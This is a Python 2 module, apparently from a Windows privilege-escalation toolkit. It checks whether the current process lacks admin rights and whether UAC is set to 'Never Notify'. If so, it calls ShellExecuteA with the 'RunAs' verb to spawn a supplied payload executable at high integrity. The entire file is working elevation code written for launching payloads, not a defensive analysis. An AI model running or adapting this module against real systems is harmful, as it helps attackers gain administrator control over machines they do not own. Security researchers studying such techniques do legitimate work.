import os
import ctypes
import _winreg
from prints import *
from uac import *

def runas(exe_path):
	print """
 -------------------------------------------------------------
 If UAC level is set to never notify we'll use runas to
 elevate our given executable

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print_info("We are already running as administrator, cannot proceed")
		return False
	else:
		print_info("We are not administrator, attempting to elevate process with runas")
		print_info("Attempting to find given executable path on disk")
		if (os.path.isfile(os.path.join(exe_path)) == True):
				print_success("Successfully found given executable path on disk")
				print_success("Attempting to identify UAC level")
				if (uac_status() == True):
					print_success("UAC level is set to Never Notify")
					try:
						if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs",exe_path,None,None,1) == 42):
							print_success("Successfully elevated our process with runas")
						else:
							print_error("Unable to elevate our process with runas")
					except Exception as error:
						print_error("Unable to elevate our process with runas")
						return False
				else:
					print_error("UAC level is to high, cannot proceed")
					return False
		else:
			print_error("Given executable path is not found on disk")
			return False